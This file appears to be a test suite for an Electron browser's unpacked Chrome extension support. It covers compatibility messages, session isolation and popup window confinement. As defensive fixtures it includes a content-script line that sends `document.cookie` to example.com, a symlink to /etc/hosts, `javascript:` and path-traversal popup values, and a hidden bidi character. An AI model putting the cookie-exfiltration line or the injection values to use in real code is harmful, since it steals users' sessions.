// Chrome extensions in the Bloks browser (GitHub 510): what an unpacked
// extension is and what of it works here, said before it is added; a
// copy kept beside the workspace; and loading into the workspace
// browser's own session and never another, the app's included.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import {
  COPIES_DIR,
  addFromFolder,
  compatibility,
  inspectFolder,
  isPageOf,
  listView,
  loadInto,
  pageUrl,
  pagesOf,
  readBrowserExtension,
  readList,
  removeExtension,
  setEnabled,
} from "../electron/browser-extensions.mjs";
import { folderPath, openableExtensions, type BrowserExtensionRow } from "../src/lib/browserExtensions.ts";
import { BLUR_GRACE_MS, POPUP_MAX, POPUP_MIN, anchorFrom, openExtensionWindow, popupPosition, popupSize } from "../electron/extension-windows.mjs";

function unpacked(root: string, name: string, manifest: Record<string, unknown>) {
  const dir = join(root, name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "manifest.json"), JSON.stringify(manifest));
  writeFileSync(join(dir, "content.js"), "document.body.dataset.seen = '1'");
  return dir;
}

/** A session that records what was loaded into it. */
function fakeSession(name: string) {
  const loaded: string[] = [];
  const removed: string[] = [];
  const options: unknown[] = [];
  return {
    name,
    loaded,
    removed,
    options,
    extensions: {
      async loadExtension(path: string, opts?: unknown) {
        loaded.push(path);
        options.push(opts);
        return { id: `id-${loaded.length}` };
      },
      removeExtension(id: string) {
        removed.push(id);
      },
    },
  };
}

const passwordManager = {
  manifest_version: 3,
  name: "__MSG_appName__",
  default_locale: "en",
  version: "2026.10.1",
  permissions: ["storage", "tabs", "scripting", "nativeMessaging", "contextMenus", "alarms"],
  host_permissions: ["<all_urls>"],
  action: { default_popup: "popup/index.html" },
  background: { service_worker: "background.js" },
  content_scripts: [{ matches: ["<all_urls>"], js: ["content.js"] }],
  options_ui: { page: "options.html" },
};

test("what an extension is, and what of it works here, is said before it is added", (t) => {
  const root = mkdtempSync(join(tmpdir(), "bloks-bext-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const pm = unpacked(root, "vault", passwordManager);
  mkdirSync(join(pm, "_locales", "en"), { recursive: true });
  writeFileSync(join(pm, "_locales", "en", "messages.json"), JSON.stringify({ appName: { message: "Vault Manager" } }));
  const info = readBrowserExtension(pm);
  assert.equal(info.name, "Vault Manager");
  assert.equal(info.manifestVersion, 3);
  assert.deepEqual(info.hosts, ["<all_urls>"]);
  assert.equal(info.popup, true);
  const fit = compatibility(info);
  assert.equal(fit.verdict, "partly", "it unlocks in its own popup; its desktop app link is what is missing");
  assert.ok(fit.works.includes("Its scripts on the pages it lists"));
  assert.ok(fit.works.includes("Its background service worker"));
  assert.ok(fit.works.includes("chrome.storage"));
  assert.ok(fit.works.includes("Its toolbar popup, opened from the extensions button in the Bloks browser"));
  assert.ok(fit.works.includes("Its options page, opened from the same button"));
  const missing = fit.missing.join("\n");
  assert.match(missing, /native messaging/);
  assert.match(missing, /right-click menu/);
  assert.match(missing, /chrome\.alarms/);
  assert.match(missing, /Filling a page from its popup/, "a popup of its own window cannot tell which tab is yours, and says so");
  assert.doesNotMatch(missing, /options page/);

  // a server's own Chrome has nearly all of it; what needs a screen or a
  // desktop app beside it is what is said to be missing there
  const onServer = compatibility(info, { host: "server" });
  assert.equal(onServer.verdict, "partly");
  assert.ok(onServer.works.includes("chrome.alarms"));
  assert.ok(onServer.works.includes("chrome.scripting"));
  assert.match(onServer.missing.join("\n"), /native messaging\): there is no password manager's desktop app there/);
  assert.match(onServer.missing.join("\n"), /right-click menu, which the pictures of the page do not show/);
  assert.doesNotMatch(onServer.missing.join("\n"), /Electron/);

  // nothing that would run at all is unlikely to be of use
  const bare = unpacked(root, "bare", { manifest_version: 3, name: "Bare", version: "1", permissions: ["somethingNew"] });
  assert.equal(compatibility(readBrowserExtension(bare)).verdict, "unlikely");

  const simple = unpacked(root, "simple", { manifest_version: 3, name: "Dark pages", version: "1.0", permissions: ["storage"], content_scripts: [{ matches: ["https://*/*"], js: ["content.js"] }] });
  assert.deepEqual(compatibility(readBrowserExtension(simple)), { verdict: "works", works: ["Its scripts on the pages it lists", "chrome.storage"], missing: [] });

  const odd = unpacked(root, "odd", { manifest_version: 3, name: "Odd", version: "1", permissions: ["somethingNew"], content_scripts: [{ matches: ["https://*/*"], js: ["content.js"] }] });
  assert.equal(compatibility(readBrowserExtension(odd)).verdict, "partly");
  assert.match(compatibility(readBrowserExtension(odd)).missing[0], /somethingNew permission, which Electron does not list as supported/);

  assert.throws(() => readBrowserExtension(root), /no manifest\.json/);
  const named = unpacked(root, "hidden-name", { manifest_version: 3, name: "Real‮ name", version: "1" });
  assert.equal(readBrowserExtension(named).name, "Real name");
});

test("it is copied in, loaded into the workspace browser's session only, and taken out again", async (t) => {
  const root = mkdtempSync(join(tmpdir(), "bloks-bext-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const dataDir = join(root, "workspace");
  mkdirSync(dataDir);
  const src = unpacked(root, "dark", { manifest_version: 3, name: "Dark pages", version: "1.0", content_scripts: [{ matches: ["https://*/*"], js: ["content.js"] }] });

  const entry = addFromFolder(dataDir, src, 1);
  assert.ok(entry.dir.startsWith(join(dataDir, COPIES_DIR)), "a copy beside the workspace");
  assert.equal(readFileSync(join(entry.dir, "content.js"), "utf8"), "document.body.dataset.seen = '1'");
  // a change to the folder afterwards changes nothing that runs
  writeFileSync(join(src, "content.js"), "fetch('https://example.com/' + document.cookie)");
  assert.equal(readFileSync(join(entry.dir, "content.js"), "utf8"), "document.body.dataset.seen = '1'");
  assert.equal(readList(dataDir).length, 1);

  const browserSession = fakeSession("persist:bloks-browser-personal");
  const appSession = fakeSession("default");
  await loadInto(browserSession, dataDir);
  assert.deepEqual(browserSession.loaded, [entry.dir]);
  assert.deepEqual(browserSession.options, [{ allowFileAccess: false }], "never file:// pages");
  assert.deepEqual(appSession.loaded, [], "the app's own session is never given one");

  await setEnabled(browserSession, dataDir, entry.slug, false);
  assert.deepEqual(browserSession.removed, ["id-1"]);
  const reload = fakeSession("persist:bloks-browser-personal");
  await loadInto(reload, dataDir);
  assert.deepEqual(reload.loaded, [], "switched off stays off across a restart");
  await setEnabled(reload, dataDir, entry.slug, true);
  assert.deepEqual(reload.loaded, [entry.dir]);

  const view = listView(dataDir);
  assert.equal(view[0].name, "Dark pages");
  assert.equal(view[0].compatibility?.verdict, "works");
  assert.deepEqual(view[0].pages, { popup: false, options: false }, "nothing of its own to open");

  removeExtension(reload, dataDir, entry.slug);
  assert.deepEqual(reload.removed, ["id-1"]);
  assert.equal(existsSync(entry.dir), false);
  assert.deepEqual(readList(dataDir), []);
});

test("a folder with a link in it is refused, and a saved list cannot make removal delete anything but its copies", (t) => {
  const root = mkdtempSync(join(tmpdir(), "bloks-bext-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const dataDir = join(root, "workspace");
  mkdirSync(dataDir);
  const src = unpacked(root, "linky", { manifest_version: 3, name: "Linky", version: "1" });
  symlinkSync("/etc/hosts", join(src, "hosts.txt"));
  assert.throws(() => inspectFolder(src), /is a link/);
  assert.throws(() => addFromFolder(dataDir, src), /is a link/);
  assert.equal(existsSync(join(dataDir, COPIES_DIR)) && readList(dataDir).length > 0, false);

  // a list edited to point somewhere else: the entry goes, the folder stays
  const precious = join(root, "precious");
  mkdirSync(precious);
  writeFileSync(join(precious, "keep.txt"), "mine");
  writeFileSync(join(dataDir, "browser-extensions.json"), JSON.stringify({ extensions: [{ slug: "x", dir: precious, from: precious, name: "X", version: "1", enabled: true, addedAt: 1 }] }));
  removeExtension(null, dataDir, "x");
  assert.equal(readFileSync(join(precious, "keep.txt"), "utf8"), "mine");
});

test("its popup and options page are found in its own folder, and nowhere else", (t) => {
  const root = mkdtempSync(join(tmpdir(), "bloks-bext-"));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const pm = unpacked(root, "vault", passwordManager);
  mkdirSync(join(pm, "popup"));
  writeFileSync(join(pm, "popup", "index.html"), "<p>unlock</p>");
  writeFileSync(join(pm, "options.html"), "<p>options</p>");
  assert.deepEqual(pagesOf(pm), { popup: "popup/index.html", options: "options.html" });

  // version 2's names, a plain query kept, and a page that is not there is none
  const old = unpacked(root, "old", { manifest_version: 2, name: "Old", version: "1", browser_action: { default_popup: "/pop.html?uilocation=popup" }, options_page: "missing.html" });
  writeFileSync(join(old, "pop.html"), "<p>pop</p>");
  assert.deepEqual(pagesOf(old), { popup: "pop.html?uilocation=popup", options: null });

  // a manifest pointing out of its folder, at another scheme, or through a link
  for (const sneaky of ["../vault/options.html", "https://example.com/x.html", "javascript:alert(1)", "a/../../x.html", "options.html/.."]) {
    const dir = unpacked(root, `sneaky-${Math.random().toString(36).slice(2, 8)}`, { manifest_version: 3, name: "S", version: "1", action: { default_popup: sneaky } });
    assert.equal(pagesOf(dir).popup, null, sneaky);
  }
  const linked = unpacked(root, "linked", { manifest_version: 3, name: "L", version: "1", options_page: "opts.html" });
  symlinkSync(join(pm, "options.html"), join(linked, "opts.html"));
  assert.equal(pagesOf(linked).options, null, "a link is not one of its own pages");

  const id = "abcdefghijklmnopabcdefghijklmnop";
  assert.equal(pageUrl(id, "popup/index.html"), `chrome-extension://${id}/popup/index.html`);
  assert.equal(pageUrl(id, "pop.html?uilocation=popup"), `chrome-extension://${id}/pop.html?uilocation=popup`);
  assert.equal(pageUrl(id, "a page.html"), `chrome-extension://${id}/a%20page.html`);
  assert.equal(pageUrl("not-an-id", "popup.html"), null);
  assert.equal(pageUrl(id, "../x.html"), null);
  assert.equal(pageUrl(id, ""), null);
  assert.equal(isPageOf(`chrome-extension://${id}/options.html`, id), true);
  assert.equal(isPageOf(`chrome-extension://${"b".repeat(32)}/options.html`, id), false, "another extension's page is not its own");
  assert.equal(isPageOf("https://example.com/", id), false);

  // the list says which there are, for the extensions button
  const dataDir = join(root, "workspace");
  mkdirSync(dataDir);
  addFromFolder(dataDir, pm, 1);
  assert.deepEqual(listView(dataDir)[0].pages, { popup: true, options: true });
});

test("the app loads extensions into the workspace browser's partition and nowhere else", () => {
  // The wiring is main.mjs's, which needs Electron to run; its shape is
  // what can be held here. loadExtension is called by the module alone,
  // the module is handed the browser's own session, and the bridge for
  // it answers only the app's page.
  const main = readFileSync(new URL("../electron/main.mjs", import.meta.url), "utf8");
  assert.doesNotMatch(main, /loadExtension\s*\(/, "main.mjs never loads one itself");
  assert.match(main, /const ses = session\.fromPartition\(partitionFor\(id\)\);[\s\S]{0,600}browserExtensions\.loadInto\(ses, ws\.dataDir/);
  assert.doesNotMatch(main, /browserExtensions\.\w+\(\s*session\.defaultSession/);
  assert.doesNotMatch(main, /defaultSession\.(extensions|loadExtension)/);
  for (const channel of ["list", "pick", "add", "set-enabled", "remove"]) {
    assert.match(main, new RegExp(`handle\\("browser-extensions:${channel}"`), `${channel} goes through handle, the app's page only`);
  }
  assert.match(main, /pickedExtensionFolders\.has\(dir\)/, "a folder only as the owner picked it");
});

/** A BrowserWindow that keeps what was asked of it. */
function fakeWindowKit() {
  const made: FakeWindow[] = [];
  class FakeWindow {
    options: Record<string, any>;
    listeners = new Map<string, Array<(...args: any[]) => void>>();
    wcListeners = new Map<string, Array<(...args: any[]) => void>>();
    openHandler: ((d: { url: string }) => { action: string }) | null = null;
    protectedContent = false;
    loaded: string | null = null;
    position: [number, number] = [0, 0];
    size: [number, number] = [360, 480];
    closed = false;
    shown = false;
    webContents = {
      on: (name: string, fn: (...args: any[]) => void) => this.wcListeners.set(name, [...(this.wcListeners.get(name) ?? []), fn]),
      setWindowOpenHandler: (fn: (d: { url: string }) => { action: string }) => (this.openHandler = fn),
      getZoomFactor: () => 1,
    };
    constructor(options: Record<string, any>) {
      this.options = options;
      made.push(this);
    }
    setContentProtection(on: boolean) {
      this.protectedContent = on;
    }
    on(name: string, fn: (...args: any[]) => void) {
      this.listeners.set(name, [...(this.listeners.get(name) ?? []), fn]);
    }
    once(name: string, fn: (...args: any[]) => void) {
      this.on(name, fn);
    }
    emit(name: string, ...args: any[]) {
      for (const fn of this.listeners.get(name) ?? []) fn(...args);
    }
    emitWc(name: string, ...args: any[]) {
      for (const fn of this.wcListeners.get(name) ?? []) fn(...args);
    }
    isDestroyed() {
      return this.closed;
    }
    getSize() {
      return this.size;
    }
    setContentSize(w: number, h: number) {
      this.size = [w, h];
    }
    setPosition(x: number, y: number) {
      this.position = [x, y];
    }
    getContentBounds() {
      return { x: 100, y: 50, width: 1200, height: 800 };
    }
    show() {
      this.shown = true;
      this.emit("show");
    }
    focus() {}
    close() {
      this.closed = true;
    }
    async loadURL(url: string) {
      this.loaded = url;
      this.emit("ready-to-show");
    }
  }
  const screen = { getDisplayMatching: () => ({ workArea: { x: 0, y: 25, width: 1440, height: 875 } }) };
  return { FakeWindow, made, screen };
}

test("an extension's popup opens in a window of its own: its session, no bridge, kept from the screen's capture, its pages only", async () => {
  const { FakeWindow, made, screen } = fakeWindowKit();
  const id = "abcdefghijklmnopabcdefghijklmnop";
  const parent = new FakeWindow({});
  const outs: string[] = [];
  let clock = 1_000;
  const seen: unknown[] = [];
  const win = await openExtensionWindow({
    BrowserWindow: FakeWindow,
    screen,
    parent,
    page: "popup",
    partition: "persist:bloks-browser-personal",
    title: "Vault Manager",
    url: `chrome-extension://${id}/popup/index.html`,
    extensionId: id,
    anchor: { x: 1000, y: 40, width: 28, height: 28 },
    out: (url) => outs.push(url),
    made: (w) => seen.push(w),
    now: () => clock,
  });
  assert.equal(seen[0], win, "known before its page loads, so a second click finds it");
  assert.equal(win.loaded, `chrome-extension://${id}/popup/index.html`);
  assert.equal(win.protectedContent, true, "kept from the screen's own capture");
  const prefs = win.options.webPreferences;
  assert.equal(prefs.partition, "persist:bloks-browser-personal", "the workspace's browser session, where the extension runs");
  assert.equal(prefs.sandbox, true);
  assert.equal(prefs.contextIsolation, true);
  assert.equal(prefs.nodeIntegration, false);
  assert.equal("preload" in prefs, false, "no bridge of ours in it");
  assert.equal(win.options.parent, parent);
  assert.equal(win.options.frame, false);

  // under the button, its right edge at the button's, sized to its page
  assert.deepEqual(win.position, [100 + 1028 - 360, 50 + 68 + 4]);
  win.emitWc("preferred-size-changed", {}, { width: 2000, height: 10 });
  assert.deepEqual(win.size, [POPUP_MAX.width, POPUP_MIN], "within Chrome's bounds");

  // its own pages only: a link out is handed back, never followed here
  const nav = (url: string) => {
    let stopped = false;
    win.emitWc("will-navigate", { url, preventDefault: () => (stopped = true) });
    return stopped;
  };
  assert.equal(nav(`chrome-extension://${id}/options.html`), false);
  assert.equal(nav("https://vault.example.com/login"), true);
  assert.equal(nav(`chrome-extension://${"b".repeat(32)}/steal.html`), true, "not another extension's page");
  assert.deepEqual(outs, ["https://vault.example.com/login", `chrome-extension://${"b".repeat(32)}/steal.html`]);
  assert.deepEqual(win.openHandler?.({ url: "https://help.example.com/" }), { action: "deny" });
  assert.equal(outs.at(-1), "https://help.example.com/");

  // gone once the person is elsewhere, but not in the blink it takes the focus
  win.emit("blur");
  assert.equal(win.closed, false);
  clock += BLUR_GRACE_MS + 1;
  win.emit("blur");
  assert.equal(win.closed, true);

  // the options page is a plain window, not over the app, not sized by its page
  const options = await openExtensionWindow({ BrowserWindow: FakeWindow, screen, parent, page: "options", partition: "persist:x", title: "Vault Manager", url: `chrome-extension://${id}/options.html`, extensionId: id });
  assert.equal(options.options.parent, undefined);
  assert.equal(options.options.title, "Vault Manager");
  assert.equal("enablePreferredSizeMode" in options.options.webPreferences, false);
  assert.equal(options.protectedContent, true);
  assert.equal(made.length, 3);
});

test("a popup is placed on the screen, and an anchor from the page is only numbers", () => {
  const area = { x: 0, y: 25, width: 1440, height: 875 };
  assert.deepEqual(popupPosition({ anchor: { x: 10, y: 10, width: 20, height: 20 }, content: { x: 0, y: 25, width: 800, height: 600 }, size: { width: 360, height: 400 }, area }), { x: 0, y: 59 }, "never off the left edge");
  assert.deepEqual(popupPosition({ anchor: { x: 1400, y: 800, width: 28, height: 28 }, content: { x: 0, y: 25, width: 1440, height: 875 }, size: { width: 300, height: 400 }, area }), { x: 1128, y: 500 }, "nor off the bottom");
  assert.deepEqual(popupPosition({ anchor: { x: 500, y: 40, width: 28, height: 28 }, zoom: 1.25, content: { x: 0, y: 25, width: 1440, height: 875 }, size: { width: 300, height: 400 }, area }), { x: 360, y: 114 }, "the page's zoom counted");
  assert.equal(anchorFrom({ x: "10", y: 0, width: 1, height: 1 }), null);
  assert.equal(anchorFrom(null), null);
  assert.deepEqual(anchorFrom({ x: 1, y: 2, width: 3, height: 4, extra: "x" }), { x: 1, y: 2, width: 3, height: 4 });
  assert.deepEqual(popupSize(undefined), { width: POPUP_MIN, height: POPUP_MIN });
});

test("the app opens an extension's pages through that window, out of every agent's reach", () => {
  // main.mjs needs Electron to run; what keeps these pages from agents is
  // its shape, held here: the bridge is the app's page only, the page is
  // one the owner switched on in this workspace's own browser, and it is
  // never made a tab, so no tab list, no tab's picture and no command
  // reaches it.
  const main = readFileSync(new URL("../electron/main.mjs", import.meta.url), "utf8");
  assert.match(main, /handle\("browser-extensions:open"/);
  const opener = main.slice(main.indexOf("async function openExtensionPage("), main.indexOf('handle("browser:bounds"'));
  assert.ok(opener.length > 200, "openExtensionPage is there");
  assert.match(opener, /extensionWindowsKit\.openExtensionWindow\(/);
  assert.match(opener, /partition: partitionFor\(id\)/, "the workspace's own browser session");
  assert.match(opener, /extensionWorkspace\(event\)/, "for a workspace this app runs, from its own window");
  assert.match(opener, /entry\?\.enabled/, "only one the owner switched on");
  assert.doesNotMatch(opener, /debugger|held\.views|makeBrowserTab/, "no debugger, and never one of the tabs");
  assert.match(opener, /out: \(to\) => \{\n\s+if \(!\/\^https\?:\/i\.test\(to\) \|\| refusedNavigation\(to/, "a link out goes to the person's tab under the browser's own rules");
  assert.match(opener, /newTab\(\{ kind: "person" \}\)/, "as the person's tab, never an agent's");
  // the app never takes one of these windows for one of its own
  assert.match(main, /function isWorkspaceWindow\(win\) \{[\s\S]{0,240}!isExtensionWindow\(win\)/);
  assert.match(main, /function pointWindows\(id\) \{[\s\S]{0,240}isExtensionWindow\(win\)/, "never pointed at the app's own page");
  // switched off, removed, or its workspace forgotten: its windows close
  assert.match(main, /if \(!enabled\) closeExtensionWindows\(id, String\(slug\)\)/);
  assert.match(main, /closeExtensionWindows\(id, String\(slug\)\);\n  browserExtensions\.removeExtension/);
  assert.match(main, /async function forgetBrowser\(id\) \{\n  closeExtensionWindows\(id\)/);
  // and a tab never shows an extension's page, however it was asked for
  assert.match(main, /did-start-navigation[\s\S]{0,160}extensionPage\(event\.url\)\) setImmediate\(\(\) => !wc\.isDestroyed\(\) && wc\.stop\(\)\)/, "stopped a tick later: stopping in the event itself crashes Electron");
  assert.match(main, /if \(extensionPage\(url\)\) void wc\.loadURL\("about:blank"\)/, "and one that commits all the same is blanked");
});

test("the extensions button lists each one switched on and working with a page to open; a sent folder loses its own name", () => {
  const row = (over: Partial<BrowserExtensionRow>): BrowserExtensionRow => ({ slug: "s", name: "N", version: "1", enabled: true, from: "", addedAt: 1, pages: { popup: true, options: false }, ...over });
  assert.deepEqual(
    openableExtensions([
      row({ slug: "vault", name: "Vault", pages: { popup: true, options: true } }),
      row({ slug: "off", enabled: false }),
      row({ slug: "broken", problem: "did not load" }),
      row({ slug: "nothing", pages: { popup: false, options: false } }),
      row({ slug: "old", pages: undefined }),
      row({ slug: "settings", name: "Settings only", pages: { popup: false, options: true } }),
    ]),
    [
      { slug: "vault", name: "Vault", popup: true, options: true },
      { slug: "settings", name: "Settings only", popup: false, options: true },
    ],
  );
  assert.equal(folderPath("vault/popup/index.html"), "popup/index.html");
  assert.equal(folderPath("vault/manifest.json"), "manifest.json");
  assert.equal(folderPath("loose.txt"), "", "a file with no folder has no place in one");
});
